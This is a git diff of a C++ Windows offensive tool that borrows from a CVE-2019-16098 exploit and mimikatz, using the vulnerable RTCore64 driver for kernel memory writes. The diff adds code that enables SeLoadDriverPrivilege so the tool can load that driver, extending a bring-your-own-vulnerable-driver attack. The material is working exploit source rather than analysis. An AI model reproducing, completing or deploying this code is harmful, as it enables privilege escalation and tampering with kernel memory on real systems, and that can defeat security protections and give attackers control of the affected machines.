@@ -1,6 +1,7 @@
 ﻿// CODE FROM
 // https://github.com/Barakat/CVE-2019-16098
 // https://github.com/gentilkiwi/mimikatz
+// https://github.com/TarlogicSecurity/EoPLoadDriver/
 
 #include <Windows.h>
 #include <aclapi.h>
@@ -15,7 +16,7 @@
 #include "resource.h"
 
 #define AUTHOR L"@aceb0nd"
-#define VERSION L"0.2"
+#define VERSION L"0.3"
 
 #if !defined(PRINT_ERROR_AUTO)
 #define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
@@ -108,6 +109,59 @@ void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
     WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
     WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
 }
+
+BOOL SetPrivilege(
+    HANDLE hToken,          // access token handle
+    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
+    BOOL bEnablePrivilege   // to enable or disable privilege
+)
+{
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+
+    if (!LookupPrivilegeValue(
+        NULL,            // lookup privilege on local system
+        lpszPrivilege,   // privilege to lookup 
+        &luid))        // receives LUID of privilege
+    {
+        printf("LookupPrivilegeValue error: %u\n", GetLastError());
+        return FALSE;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    if (bEnablePrivilege)
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    else
+        tp.Privileges[0].Attributes = 0;
+
+    // Enable the privilege or disable all privileges.
+
+    if (!AdjustTokenPrivileges(
+        hToken,
+        FALSE,
+        &tp,
+        sizeof(TOKEN_PRIVILEGES),
+        (PTOKEN_PRIVILEGES)NULL,
+        (PDWORD)NULL))
+    {
+        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
+        return FALSE;
+    }
+
+    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+
+    {
+        printf("The token does not have the specified privilege. \n");
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+
+
+
 
 // END driver comms code
 // START Mimikatz driver install/uninstall code
@@ -556,6 +610,14 @@ int wmain(int argc, wchar_t* argv[]) {
             " [/uninstallDriver]", argv[0]);
         return 0;
     }
+
+    HANDLE hToken;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        wprintf(L"OpenProcessToken error\n");
+    }
+    SetPrivilege(hToken, SE_LOAD_DRIVER_NAME, TRUE);
+
+
 
     const auto svcName = L"RTCore64";
 
